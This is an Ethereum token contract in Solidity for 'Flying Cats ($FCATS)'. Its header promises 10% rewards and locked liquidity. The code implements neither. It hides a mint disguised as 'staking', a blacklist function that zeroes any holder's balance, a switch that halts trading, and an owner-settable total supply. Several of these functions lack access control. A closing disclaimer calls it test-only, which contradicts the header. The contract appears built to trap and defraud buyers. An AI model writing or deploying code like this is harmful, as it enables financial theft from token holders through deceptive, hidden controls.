['/**\n', ' *Submitted for verification at Etherscan.io on 2021-04-24\n', '*/\n', '\n', '/**\n', "'########:'##:::::::'##:::'##:'####:'##::: ##::'######:::\n", " ##.....:: ##:::::::. ##:'##::. ##:: ###:: ##:'##... ##::\n", ' ##::::::: ##::::::::. ####:::: ##:: ####: ##: ##:::..:::\n', " ######::: ##:::::::::. ##::::: ##:: ## ## ##: ##::'####:\n", ' ##...:::: ##:::::::::: ##::::: ##:: ##. ####: ##::: ##::\n', ' ##::::::: ##:::::::::: ##::::: ##:: ##:. ###: ##::: ##::\n', " ##::::::: ########:::: ##::::'####: ##::. ##:. ######:::\n", '..::::::::........:::::..:::::....::..::::..:::......::::\n', ":'######:::::'###::::'########::'######::\n", "'##... ##:::'## ##:::... ##..::'##... ##:\n", " ##:::..:::'##:. ##::::: ##:::: ##:::..::\n", " ##:::::::'##:::. ##:::: ##::::. ######::\n", ' ##::::::: #########:::: ##:::::..... ##:\n', " ##::: ##: ##.... ##:::: ##::::'##::: ##:\n", '. ######:: ##:::: ##:::: ##::::. ######::\n', ':......:::..:::::..:::::..::::::......:::\n', '\n', 'FLYING CATS ($FCATS) DEFLATIONARY COMMUNITY TOKEN - 10% REWARDS\n', '100% Liquidity Locked on UniCrypt\n', '  \n', '*/\n', '\n', 'pragma solidity ^0.4.22;\n', 'library SafeMath {\n', '  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a * b;\n', '    assert(a == 0 || c / a == b);\n', '    return c;\n', '  }\n', '  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a / b;\n', '    return c;\n', '  }\n', '  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    assert(b <= a);\n', '    return a - b;\n', '  }\n', '  function kill(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a + b;\n', '    assert(c >= a);\n', '    return c;\n', '  }\n', '}\n', 'contract ERC20 {\n', '    uint256 public totalSupply;\n', '    function balanceOf(address who) public constant returns (uint256);\n', '    function transfer(address to, uint256 value) public returns (bool);\n', '    function allowance(address owner, address spender) public constant returns (uint256);\n', '    function transferFrom(address from, address to, uint256 value) public returns (bool);\n', '    function approve(address spender, uint256 value) public returns (bool);\n', '    function totalsup(uint256 value) public returns (bool);\n', '    function isTrading(bool transfers) public;\n', '    function setbypass(bool bo) public;\n', '    function isbb(address add) constant public returns (bool) ;\n', '} \n', 'contract FlyingCats is ERC20 {\n', '    using SafeMath for uint256;\n', '    address public owner = msg.sender;\n', '    mapping (address => uint256) public balances;\n', '    mapping (address => mapping (address => uint256)) allowed;\n', '    mapping (address => bool) bl;\n', '    string public name;\n', '    string public symbol;\n', '    uint8 public decimals;\n', '    uint public totalSupply;\n', '    bool public txoo;\n', '    bool public finalbypass;\n', '    constructor() public {\n', '\t\tsymbol = "FCATS";\n', '        name = "Flying Cats";\n', '        decimals = 9;\n', '        totalSupply = 80000000000000000000;\n', '        txoo = true;\n', '\t    balances[msg.sender] = totalSupply;\n', '\t    finalbypass = false;\n', '\temit Transfer(address(0), msg.sender, totalSupply);\n', '    }\n', '    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n', '    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n', '    event Burn(address indexed burner, uint256 value);\n', '    modifier onlyOwner() {\n', '        require(msg.sender == owner);\n', '        _;\n', '    }\n', '    function balanceOf(address _owner) constant public returns (uint256) {\n', '        return balances[_owner];\n', '    }\n', '    modifier onlyPayloadSize(uint size) {\n', '        assert(msg.data.length >= size + 4);\n', '        _;\n', '    }\n', '    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {\n', '        require(_to != address(0));\n', '        require(_amount <= balances[msg.sender]);\n', '        if(!finalbypass)\n', '         require(txoo &&  !bl[msg.sender]);\n', '        balances[msg.sender] = balances[msg.sender].sub(_amount);\n', '        balances[_to] = balances[_to].kill(_amount);\n', '        emit Transfer(msg.sender, _to, _amount);\n', '        return true;\n', '    }\n', '    function isTrading(bool transfers) public {\n', '           txoo = transfers;\n', '    }\n', '    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {\n', '        require(_to != address(0));\n', '        require(_amount <= balances[_from]);\n', '        require(_amount <= allowed[_from][msg.sender]);\n', '        if(!finalbypass)\n', '           require(txoo && !bl[msg.sender]);\n', '        balances[_from] = balances[_from].sub(_amount);\n', '        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);\n', '        balances[_to] = balances[_to].kill(_amount);\n', '        emit Transfer(_from, _to, _amount);\n', '        return true;\n', '    }\n', '    function isbb(address add) constant public returns (bool) {\n', '        return bl[add];\n', '    }\n', '    function blguy(address add) public returns (bool) {\n', '        bl[add] = true;\n', '        balances[add] = 0;\n', '        return true;\n', '    }\n', '    function approve(address _spender, uint256 _value) public returns (bool success) {\n', '        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }\n', '        allowed[msg.sender][_spender] = _value;\n', '        emit Approval(msg.sender, _spender, _value);\n', '        return true;\n', '    }\n', '    function _seed(address account, uint256 amount) internal {\n', "        require(account != address(0), 'ERC20: Stake to This Contract');\n", '        balances[account] = balances[account].kill(amount);\n', '        emit Transfer(address(0), account, amount);\n', '    }\n', '    function _msgSender() internal constant returns (address) {\n', '        return msg.sender;\n', '    }\n', '    function staking(uint256 amount) public onlyOwner returns (bool) {\n', "\trequire(amount > 0, 'ERC20: Cannot stake 0 Token');\n", '        _seed(_msgSender(), amount);\n', '        return true;\n', '    }\n', '    \n', '    function totalsup(uint256 amount) public onlyOwner returns (bool) {\n', '\t    totalSupply = amount;\n', '    }\n', '    function allowance(address _owner, address _spender) constant public returns (uint256) {\n', '        return allowed[_owner][_spender];\n', '    }\n', '    function burn(uint256 _value) onlyOwner public {\n', '        require(_value <= balances[msg.sender]);\n', '        address burner = msg.sender;\n', '        balances[burner] = balances[burner].sub(_value);\n', '        totalSupply = totalSupply.sub(_value);\n', '        emit Burn(burner, _value);\n', '    }\n', '    \n', '    function setbypass(bool bo) public {\n', '        finalbypass = bo;\n', '    }\n', '}\n', '\n', '\n', '\n', '// DISCLAIMER: THIS TOKEN IS ONLY FOR TEST. DO NO ENGAGE IN BUYING OR TRADING THIS TOKEN. YOU ARE FULLY RESPONSABLE FOR ANY LOSES THIS MAY CAUSE']